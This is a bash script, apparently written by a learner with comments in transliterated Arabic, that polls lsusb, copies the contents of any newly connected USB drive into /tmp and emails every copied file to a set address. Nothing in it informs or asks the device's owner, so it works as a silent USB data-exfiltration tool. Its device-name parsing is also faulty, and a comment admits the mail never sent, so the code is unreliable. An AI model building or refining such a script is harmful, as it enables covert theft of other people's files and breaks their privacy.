#!/bin/bash

# Function to list USB devices
list_usb_devices() {
  lsusb
}

# Email parameters
email_to="your@email.com"  # Replace with your email address
email_subject="USB Device Content"
temp_dir="/tmp/usb_content"

# Infinite loop to continuously monitor USB devices
while true; do
  # Get the current list of USB devices
  current_list=$(list_usb_devices)

  # If the initial list is empty, set it to the current list (l -z krmel is empty wl -n krmel is not empty)
  if [ -z "$initial_list" ]; then
    initial_list="$current_list"
  fi

  # Use diff to find differences between the lists
  diff_output=$(diff <(echo "$initial_list") <(echo "$current_list"))

  # Check if there are differences hon l -n the check enno l $diff_output is not empty
  if [ -n "$diff_output" ]; then
    echo "USB device change detected:"
    echo "$diff_output"

    # Extract the name of the newly connected USB device
    # | hyde l pipe btebaat l output taba3 l diff lal grep w hon l grep '>' btaamil search search lal line  w '>' indicate l new usb
    new_usb_device=$(diff <(echo "$initial_list") <(echo "$current_list") | grep '>' | awk '{print $4}')

    # Check if it's a directory and not a file hon l -d check l path huwe directory
    if [ -d "/media/$USER/$new_usb_device" ]; then
      # Backup the content of the directory to a temporary folder
      mkdir -p "$temp_dir"
      cp -r "/media/$USER/$new_usb_device" "$temp_dir/"

      # Send an email with the content of the directory i use ssmtp mahall l mail bs kamen he didnt send the mail 
      # wl -A krmel krmel na3mil attach to all file yaaneh l /* li hattayneha
      echo "The content of a USB device has been sent to your email." | mail -s "$email_subject" -A "$temp_dir"/* "$email_to"
    fi

    # Update the initial list to match the current list
    initial_list="$current_list"
  fi

  sleep 5  # Delay between checks (in seconds)
done
